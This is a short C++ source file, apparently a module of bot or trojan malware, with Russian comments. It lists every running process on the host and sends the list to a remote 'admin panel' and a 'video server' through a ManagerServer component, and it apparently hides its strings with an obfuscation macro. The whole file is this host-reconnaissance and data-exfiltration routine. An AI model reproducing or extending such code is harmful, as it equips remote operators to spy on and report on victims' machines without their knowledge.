#include "other.h"
#include "Manager.h"

static bool ListProcessCallback( Process::ProcessInfo& pi, void* tag )
{
	StringBuilder* s = (StringBuilder*)tag;
	s->Cat( pi.fileName );
	s->Cat('\r');
	s->Cat('\n');
	return false;
}

int ListProcess( StringBuilder& s )
{
	s.SetEmpty();
	return Process::ListProcess( ListProcessCallback, &s );
}

bool SendListProcess( int dst )
{
	StringBuilder s;
	ListProcess(s);
	if( dst & 1 ) //отсылка в админку
	{
		ManagerServer::SendData( _CS_("listprocess"), s.c_str(), s.Len(), true, _CS_("listprocess.txt") );
	}
	if( dst & 2 ) //отсылка на сервер
	{
		ManagerServer::SendFileToVideoServer( _CS_("data"), _CS_("listprocess"), _CS_("txt"), s );
	}
	return true;
}
